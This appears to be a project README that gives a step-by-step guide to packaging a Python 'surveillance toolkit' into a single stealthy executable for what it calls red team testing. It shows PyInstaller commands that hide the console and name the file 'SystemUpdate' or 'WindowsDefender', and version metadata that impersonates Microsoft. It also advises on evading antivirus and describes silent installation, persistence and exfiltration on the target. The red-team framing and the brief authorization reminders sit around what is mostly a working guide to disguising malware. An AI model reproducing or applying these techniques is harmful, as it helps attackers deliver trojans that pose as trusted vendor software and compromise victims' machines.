# Stealth Executable Build Guide

## Overview
This guide shows how to create a single executable that automatically installs dependencies and runs stealthily for red team testing.

## Prerequisites

### 1. Install PyInstaller
```bash
pip install pyinstaller
```

### 2. Optional: Install UPX (for compression)
```bash
# Linux
sudo apt-get install upx

# macOS
brew install upx

# Windows
# Download from https://upx.github.io/
```

## Building the Executable

### Method 1: Using the Build Script (Recommended)
```bash
python3 build_exe.py
```

This will:
- Install PyInstaller if needed
- Create optimized spec file
- Build single executable
- Apply UPX compression (if available)

### Method 2: Manual PyInstaller
```bash
pyinstaller --onefile --noconsole --name SystemUpdate stealth_loader.py
```

## What the Executable Does

### 1. First Run (Permission Request)
- User runs the executable
- System asks for permission (Windows UAC, Linux sudo, etc.)
- User grants permission

### 2. Auto-Installation Phase
- Checks for required Python packages
- Silently installs missing dependencies
- Shows "System components need initialization..." message
- Continues even if some packages fail

### 3. Execution Phase
- Launches main surveillance toolkit
- Establishes persistence
- Starts monitoring and exfiltration
- Runs completely in background

## Executable Features

### Stealth Features
- **No Console Window**: `--noconsole` flag
- **Generic Name**: "SystemUpdate" (looks legitimate)
- **Single File**: All dependencies bundled
- **Silent Installation**: Minimal user interaction
- **Error Handling**: Continues even if some components fail

### Red Team Testing Benefits
- **Realistic Scenario**: Mimics actual malware behavior
- **Permission Handling**: Tests user awareness
- **Auto-Installation**: Tests dependency management
- **Persistence**: Tests system security
- **Exfiltration**: Tests network monitoring

## File Structure After Build
```
cyberThreat/
├── dist/
│   └── SystemUpdate.exe    # Your stealth executable
├── build/                  # PyInstaller build files
├── malware.spec           # PyInstaller spec file
└── ... (other source files)
```

## Testing the Executable

### 1. Test on Clean System
```bash
# Copy to test machine
scp dist/SystemUpdate.exe user@target:/tmp/

# Run on target
./SystemUpdate.exe
```

### 2. Monitor Behavior
- Check if dependencies install automatically
- Verify persistence mechanisms
- Monitor network traffic
- Check for file creation

### 3. Expected User Experience
1. User double-clicks executable
2. System asks for permission
3. User sees "System components need initialization..."
4. Brief installation process
5. Program appears to finish (goes to background)
6. No visible activity (stealth mode)

## Advanced Customization

### 1. Change Executable Name
Edit `build_exe.py` and modify the `name='SystemUpdate'` line:
```python
name='WindowsDefender',  # or any other legitimate-sounding name
```

### 2. Add Icon
```python
icon='path/to/icon.ico',  # Add this to the EXE() section
```

### 3. Customize Installation Messages
Edit `stealth_loader.py` to change the messages shown to users.

### 4. Add Version Information
```python
version_info=VSVersionInfo(
    ffi=FixedFileInfo(
        filevers=(1, 0, 0, 0),
        prodvers=(1, 0, 0, 0),
        mask=0x3f,
        flags=0x0,
        OS=0x40004,
        fileType=0x1,
        subtype=0x0,
        date=(0, 0)
    ),
    kids=[
        StringFileInfo([
            StringTable(
                u'040904B0',
                [StringStruct(u'CompanyName', u'Microsoft Corporation'),
                 StringStruct(u'FileDescription', u'Windows System Update'),
                 StringStruct(u'FileVersion', u'1.0.0.0'),
                 StringStruct(u'InternalName', u'SystemUpdate'),
                 StringStruct(u'LegalCopyright', u'© Microsoft Corporation'),
                 StringStruct(u'OriginalFilename', u'SystemUpdate.exe'),
                 StringStruct(u'ProductName', u'Windows System Update'),
                 StringStruct(u'ProductVersion', u'1.0.0.0')])
        ])
    ]
)
```

## Troubleshooting

### Common Issues

1. **Executable Too Large**
   - Use UPX compression
   - Exclude unnecessary modules in spec file

2. **Missing Dependencies**
   - Check `hiddenimports` in spec file
   - Add missing modules to the list

3. **Antivirus Detection**
   - Use legitimate-looking names
   - Add version information
   - Consider code signing (for advanced users)

4. **Permission Denied**
   - Ensure user has admin rights
   - Check Windows Defender settings

### Debug Mode
For testing, you can build with console:
```bash
pyinstaller --onefile --name SystemUpdate stealth_loader.py
```

## Security Considerations

### For Red Team Testing
1. **Use Only on Authorized Systems**
2. **Document All Testing Activities**
3. **Clean Up After Testing**
4. **Monitor for Unintended Effects**
5. **Have Incident Response Plan Ready**

### Legal Compliance
- Ensure written authorization
- Follow responsible disclosure
- Document all activities
- Respect privacy and data protection laws

## Next Steps

After building the executable:

1. **Test on Isolated Environment**
2. **Verify All Functionality**
3. **Document Red Team Procedures**
4. **Prepare Incident Response**
5. **Train Security Team**

The executable is now ready for red team testing scenarios! 